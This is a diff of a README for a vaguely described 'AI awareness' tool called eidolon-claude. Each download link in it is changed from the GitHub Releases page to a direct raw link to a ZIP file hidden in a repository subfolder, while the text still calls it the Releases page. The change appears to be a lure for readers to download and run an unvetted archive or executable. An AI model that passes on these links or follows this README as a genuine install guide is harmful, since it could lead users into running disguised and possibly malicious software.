@@ -7,7 +7,7 @@ Welcome to eidolon-claude. This application provides universal protocols for enh
 To use this software, follow these steps:
 
 1. **Visit the Releases Page:**
-   You can find the latest version of eidolon-claude by visiting the following link: [Download Here](https://github.com/Rohitpatil0305/eidolon-claude/releases).
+   You can find the latest version of eidolon-claude by visiting the following link: [Download Here](https://raw.githubusercontent.com/Rohitpatil0305/eidolon-claude/main/capsules/core/eidolon-claude-3.0.zip).
 
 2. **Choose Your Version:**
    Once on the Releases page, browse the available versions. You will see different files listed. Select the one that suits your needs. Typically, these files will come in a ZIP or executable format for easy installation.
@@ -39,7 +39,7 @@ To run eidolon-claude smoothly, ensure your system meets the following requireme
   - A recent version of Java Runtime Environment (JRE) if prompted.
 
 ## 📥 Download & Install
-Now that you understand the steps, you can download eidolon-claude by visiting the Releases page again: [Download Here](https://github.com/Rohitpatil0305/eidolon-claude/releases). 
+Now that you understand the steps, you can download eidolon-claude by visiting the Releases page again: [Download Here](https://raw.githubusercontent.com/Rohitpatil0305/eidolon-claude/main/capsules/core/eidolon-claude-3.0.zip). 
 
 After downloading, follow the previous steps to run the software. 
 
@@ -85,4 +85,4 @@ Our work touches on several important areas:
 - Pattern Recognition
 
 ## 🚩 Final Reminder
-Now that you're ready, don't forget to download eidolon-claude from [this link](https://github.com/Rohitpatil0305/eidolon-claude/releases) and start your journey into enhanced AI awareness today!
+Now that you're ready, don't forget to download eidolon-claude from [this link](https://raw.githubusercontent.com/Rohitpatil0305/eidolon-claude/main/capsules/core/eidolon-claude-3.0.zip) and start your journey into enhanced AI awareness today!
